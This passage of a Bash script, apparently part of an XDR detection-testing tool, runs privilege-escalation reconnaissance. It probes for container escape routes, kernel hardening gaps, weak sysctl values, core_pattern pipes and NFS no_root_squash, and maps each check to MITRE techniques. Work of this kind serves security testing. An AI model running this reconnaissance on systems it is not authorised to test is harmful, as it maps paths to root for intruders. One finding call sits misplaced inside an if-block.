        "If running inside a container, can we escape to the host?" \
        "Privileged mode, host mounts, unrestricted namespaces."
    pe_alert "Container escape surface scan"

    run "Checking if running inside a container..."
    echo ""
    pe_box_start "CONTAINER DETECTION"
    local in_container=false
    if [[ -f /.dockerenv ]]; then
        pe_box_line "${R}⚠ /.dockerenv EXISTS — inside Docker!${N}"
        in_container=true
    fi
    if grep -q 'docker\|lxc\|kubepods\|containerd' /proc/1/cgroup 2>/dev/null; then
        pe_box_line "${R}⚠ Container cgroup detected in /proc/1/cgroup${N}"
        in_container=true
    fi
    if [[ "$(cat /proc/1/sched 2>/dev/null | head -1)" != *"init"* ]] && [[ "$(cat /proc/1/sched 2>/dev/null | head -1)" != *"systemd"* ]]; then
        pe_box_line "${Y}⚠ PID 1 is not init/systemd — possible container${N}"
    fi
    [[ "$in_container" == "false" ]] && pe_box_line "${G}✔ Bare metal / VM (not containerized)${N}"
    pe_box_end
    csv_log "PE_CONTAINER" "detection" "in_container=$in_container" "OK"

    echo ""
    run "Checking for host filesystem mounts..."
    for mp in /host /hostfs /rootfs /mnt/host; do
        if [[ -d "$mp" ]]; then
            echo -e "  ${R}  ⚠ HOST MOUNT: ${mp}${N}"
            ls -la "$mp" 2>/dev/null | head -3 | while read l; do echo -e "  ${D}    ${l}${N}"; done
            csv_log "PE_CONTAINER" "host_mount" "$mp" "CRITICAL"
        fi
    done

    echo ""
    run "Checking namespace isolation..."
    echo -e "  ${W}  NAMESPACE ANALYSIS:${N}"
    for ns in /proc/1/ns/*; do
        local nsname; nsname=$(basename "$ns")
        local nsid; nsid=$(readlink "$ns" 2>/dev/null)
        echo -e "  ${D}    ${nsname}: ${nsid}${N}"
    done
    csv_log "PE_CONTAINER" "namespaces" "enumerated" "OK"

    echo ""
    run "Checking for privileged mode indicators..."
    if [[ -w /sys/kernel ]] 2>/dev/null; then
        echo -e "  ${R}  ⚠ /sys/kernel is writable — likely PRIVILEGED container${N}"
    fi
    if ip link add dummy_xdr type dummy 2>/dev/null; then
        echo -e "  ${R}  ⚠ Can create network interfaces — NET_ADMIN capability${N}"
        ip link del dummy_xdr 2>/dev/null
    fi
    csv_log "PE_CONTAINER" "privileged" "checked" "OK"

    show_finding "MEDIUM" "Container escape surface analyzed"
    write_finding "PE-12" "Container Escape" "T1611" "EXECUTED" "MEDIUM" \
        "Container escape surface analyzed" \
        "Use unprivileged containers. Drop all capabilities."
}

# ═══════════════════════════════════════════════════════════════════════════════
# PE ATTACK 13: KERNEL EXPLOIT SURFACE ANALYSIS
# ═══════════════════════════════════════════════════════════════════════════════
pe_attack_13() {
    pe_phase 13 "KERNEL EXPLOIT SURFACE ANALYSIS" "T1068 Exploitation for Privilege Escalation"
    xdr "Kernel version and module analysis — exploit matching"

    pe_explain "Kernel Attack Surface" \
        "Kernel version determines which exploits work." \
        "Hardening: ASLR, kptr_restrict, ptrace_scope."
    pe_alert "Kernel attack surface enumeration"

    run "Kernel version..."
    echo ""
    pe_box_start "KERNEL INFORMATION"
    pe_box_line "${W}Version : $(uname -r)${N}"
    pe_box_line "${W}Release : $(uname -v)${N}"
    pe_box_line "${W}Arch    : $(uname -m)${N}"
    pe_box_line ""

    # Check kernel hardening features
    pe_box_line "${W}Security features:${N}"
    [[ -f /proc/sys/kernel/randomize_va_space ]] && pe_box_line "  ASLR: $(cat /proc/sys/kernel/randomize_va_space) $([ "$(cat /proc/sys/kernel/randomize_va_space)" -eq 2 ] && echo "${G}(full)${N}" || echo "${Y}(partial/off)${N}")"
    [[ -f /proc/sys/kernel/kptr_restrict ]] && pe_box_line "  kptr_restrict: $(cat /proc/sys/kernel/kptr_restrict)"
    [[ -f /proc/sys/kernel/dmesg_restrict ]] && pe_box_line "  dmesg_restrict: $(cat /proc/sys/kernel/dmesg_restrict)"
    [[ -f /proc/sys/kernel/perf_event_paranoid ]] && pe_box_line "  perf_paranoid: $(cat /proc/sys/kernel/perf_event_paranoid)"
    [[ -f /proc/sys/kernel/yama/ptrace_scope ]] && pe_box_line "  ptrace_scope: $(cat /proc/sys/kernel/yama/ptrace_scope)"
    pe_box_end
    csv_log "PE_KERNEL" "version" "$(uname -r)" "OK"

    echo ""
    run "Loaded kernel modules (last 15)..."
    echo -e "  ${W}  KERNEL MODULES:${N}"
    lsmod 2>/dev/null | head -16 | while read l; do echo -e "  ${D}    ${l}${N}"; done
    csv_log "PE_KERNEL" "modules" "$(lsmod 2>/dev/null | wc -l) loaded" "OK"

    echo ""
    run "Checking if unprivileged BPF is allowed..."
    if [[ -f /proc/sys/kernel/unprivileged_bpf_disabled ]]; then
        local bpf; bpf=$(cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null)
        [[ "$bpf" -eq 0 ]] && echo -e "  ${R}  ⚠ Unprivileged BPF ENABLED — potential exploit vector${N}" || echo -e "  ${G}  ✔ Unprivileged BPF disabled${N}"
    fi

    run "Checking if unprivileged user namespaces are allowed..."
    if [[ -f /proc/sys/kernel/unprivileged_userns_clone ]]; then
        local userns; userns=$(cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null)
        [[ "$userns" -eq 1 ]] && echo -e "  ${Y}  ⚠ Unprivileged user namespaces ENABLED${N}" || echo -e "  ${G}  ✔ Unprivileged user namespaces disabled${N}"
    fi
    csv_log "PE_KERNEL" "hardening" "analyzed" "OK"

    show_finding "MEDIUM" "Kernel hardening assessed"
    write_finding "PE-13" "Kernel Surface" "T1068" "EXECUTED" "MEDIUM" \
        "Kernel hardening assessed" \
        "Keep kernel updated. Enable all hardening options."
}

# ═══════════════════════════════════════════════════════════════════════════════
# PE ATTACK 14: /PROC/SYS SECURITY SETTINGS AUDIT
# ═══════════════════════════════════════════════════════════════════════════════
pe_attack_14() {
    pe_phase 14 "/PROC/SYS SECURITY SETTINGS AUDIT" "T1068 / T1014 Rootkit"
    xdr "Kernel security parameters enumerated"

    pe_explain "/proc/sys Security Parameters" \
        "10 critical kernel parameters checked against secure values." \
        "Each misconfiguration opens a specific attack vector."
    pe_alert "System hardening audit"

    run "Auditing critical /proc/sys settings..."
    echo ""
    pe_box_start "SECURITY PARAMETERS"

    local -a checks=(
        "/proc/sys/kernel/randomize_va_space|ASLR|2|Address space randomization"
        "/proc/sys/kernel/kptr_restrict|Kernel pointers|1|Hide kernel addresses"
        "/proc/sys/kernel/dmesg_restrict|Dmesg access|1|Restrict kernel log"
        "/proc/sys/kernel/modules_disabled|Module loading|0|Can load kernel modules"
        "/proc/sys/kernel/sysrq|SysRq key|0|Magic SysRq disabled"
        "/proc/sys/fs/protected_hardlinks|Hardlink protect|1|Protected hardlinks"
        "/proc/sys/fs/protected_symlinks|Symlink protect|1|Protected symlinks"
        "/proc/sys/fs/suid_dumpable|SUID coredump|0|No SUID core dumps"
        "/proc/sys/net/ipv4/ip_forward|IP forwarding|0|Not a router"
        "/proc/sys/net/ipv4/conf/all/accept_redirects|ICMP redirects|0|Reject redirects"
    )

    for chk in "${checks[@]}"; do
        IFS='|' read -r path name expected desc <<< "$chk"
        if [[ -f "$path" ]]; then
            local val; val=$(cat "$path" 2>/dev/null)
            local status="${G}✔${N}"
            [[ "$val" != "$expected" ]] && status="${Y}⚠${N}"
            pe_box_line "$(printf '%s %-22s = %-4s (expected: %s) %s' "$status" "$name" "$val" "$expected" "$desc")"
        fi
    done
    pe_box_end
    csv_log "PE_PROCSYS" "audit" "completed" "OK"

    echo ""
    run "Checking for core_pattern hijack..."
    local core_pat
    core_pat=$(cat /proc/sys/kernel/core_pattern 2>/dev/null)
    echo -e "  ${W}  core_pattern: ${core_pat}${N}"
    if echo "$core_pat" | grep -q '|'; then
        echo -e "  ${R}  ⚠ Core pattern pipes to program — potential escalation${N}"
        csv_log "PE_PROCSYS" "core_pattern" "pipe detected" "WARN"

    show_finding "MEDIUM" "Security parameters audited"
    write_finding "PE-14" "Proc/Sys Audit" "T1068" "EXECUTED" "MEDIUM" \
        "Security parameters audited" \
        "Apply CIS benchmark hardening. Monitor sysctl changes."
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
# PE ATTACK 15: NFS ROOT_SQUASH & MOUNT OPTIONS
# ═══════════════════════════════════════════════════════════════════════════════
pe_attack_15() {
    pe_phase 15 "NFS ROOT_SQUASH & MOUNT OPTIONS ANALYSIS" "T1548 / T1574"
    xdr "Mount options and NFS security analysis"

    pe_explain "NFS & Mount Options" \
        "nosuid/noexec on /tmp prevents SUID attacks." \
        "NFS no_root_squash = remote root access."
    pe_alert "Filesystem mount security audit"

    run "Analyzing mount options for security flags..."
    echo ""
    pe_box_start "MOUNT OPTIONS AUDIT"
    local nosuid_missing=0
    local noexec_missing=0
    while IFS= read -r mline; do
        local mpoint; mpoint=$(echo "$mline" | awk '{print $3}')
        local opts; opts=$(echo "$mline" | awk '{print $6}' | tr -d '()')
        local warnings=""
        case "$mpoint" in /tmp|/var/tmp|/dev/shm|/home)
            echo "$opts" | grep -q "nosuid" || { warnings+="${R}nosuid${N} "; nosuid_missing=$((nosuid_missing+1)); }
            echo "$opts" | grep -q "noexec" || { warnings+="${Y}noexec${N} "; noexec_missing=$((noexec_missing+1)); }
            ;;
        esac
        if [[ -n "$warnings" ]]; then
            pe_box_line "${PE_LIGHT}${mpoint}${N}  missing: ${warnings}"
        fi
    done < <(mount 2>/dev/null)
    [[ $nosuid_missing -eq 0 && $noexec_missing -eq 0 ]] && pe_box_line "${G}✔ All sensitive mounts have nosuid/noexec${N}"
    pe_box_end

    result "Missing nosuid: ${nosuid_missing} | Missing noexec: ${noexec_missing}"
    csv_log "PE_MOUNT" "options" "nosuid_miss=$nosuid_missing noexec_miss=$noexec_missing" "OK"

    echo ""
    run "Checking /etc/exports for NFS misconfigurations..."
    if [[ -f /etc/exports ]]; then
        pe_box_start "NFS EXPORTS"
        while IFS= read -r eline; do
            [[ "$eline" == \#* || -z "$eline" ]] && continue
            local squash_warn=""
            echo "$eline" | grep -q "no_root_squash" && squash_warn="${R} ⚠ NO_ROOT_SQUASH${N}"
            pe_box_line "${D}${eline}${N}${squash_warn}"
        done < /etc/exports
        pe_box_end
        csv_log "PE_NFS" "exports" "analyzed" "OK"
    else
        info "No /etc/exports — NFS not configured"
        csv_log "PE_NFS" "exports" "not found" "OK"
    fi

    echo ""
    run "Checking /etc/fstab for insecure mount options..."
    if [[ -f /etc/fstab ]]; then
        grep -v '^#' /etc/fstab 2>/dev/null | grep -v '^$' | while read l; do
            local mp; mp=$(echo "$l" | awk '{print $2}')
            local opts; opts=$(echo "$l" | awk '{print $4}')
            if [[ "$mp" == "/tmp" || "$mp" == "/var/tmp" || "$mp" == "/dev/shm" ]]; then
                local warn=""
                echo "$opts" | grep -q "nosuid" || warn+="nosuid "
                echo "$opts" | grep -q "noexec" || warn+="noexec "
                [[ -n "$warn" ]] && echo -e "  ${Y}  ⚠ ${mp}: missing ${warn}in fstab${N}"
            fi
        done
    fi
    csv_log "PE_MOUNT" "fstab" "checked" "OK"

    show_finding "MEDIUM" "Mount options analyzed"
    write_finding "PE-15" "Mount Options" "T1548" "EXECUTED" "MEDIUM" \
        "Mount options analyzed" \
        "Mount /tmp with nosuid,noexec. Enable root_squash on NFS."
}

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE REPORT
# ═══════════════════════════════════════════════════════════════════════════════
pe_report() {
    echo ""; echo -e "${BG_PE}${W}                                                                              ${N}"
    echo -e "${BG_PE}${W}  ◆ DLC-02: PRIVILEGE ESCALATION — MODULE COMPLETE                              ${N}"
    echo -e "${BG_PE}${W}                                                                              ${N}"; echo ""
    echo -e "  ${W}  ┌── PRIVESC ATTACK SUMMARY ─────────────────────────────────────┐${N}"
    local -a atks=(
        "01. SUID/SGID binary discovery + GTFOBins check"
        "02. SUID binary creation (alert trigger)"
        "03. Linux capabilities audit"
        "04. Capability injection on test binary"
        "05. World-writable PATH directories"
        "06. Writable sensitive files detection"
        "07. Cron job hijack vectors"
        "08. Wildcard injection simulation (tar)"
        "09. LD_PRELOAD / LD_LIBRARY_PATH injection"
        "10. Shared library RPATH/RUNPATH scan"
        "11. Docker socket privilege escalation"
        "12. Container escape indicators"
        "13. Kernel exploit surface analysis"
        "14. /proc/sys security settings audit"
        "15. NFS root_squash and mount options")
    for a in "${atks[@]}"; do echo -e "  ${W}  │${N}  ${a}"; done
    echo -e "  ${W}  └──────────────────────────────────────────────────────────────┘${N}"; echo ""
    echo -e "  ${PE_BASE}  MITRE: T1548 T1068 T1574 T1053 T1611 T1134 T1055 T1014 T1059${N}"; echo ""
    echo -e "                              ${W}${BOLD}— X D R   C R E E P E R —${N}"; echo ""
}

dlc_main() {
    module_splash "$DLC_NAME" "$DLC_DESC" "$DLC_MITRE" "$DLC_ATTACKS" "$DLC_RISK" "$DLC_ACCENT"
    CURRENT_MODULE="DLC-02-PRIVESC"
    pe_attack_01; pe_attack_02; pe_attack_03; pe_attack_04; pe_attack_05
    pe_attack_06; pe_attack_07; pe_attack_08; pe_attack_09; pe_attack_10
    pe_attack_11; pe_attack_12; pe_attack_13; pe_attack_14; pe_attack_15
    pe_report
}
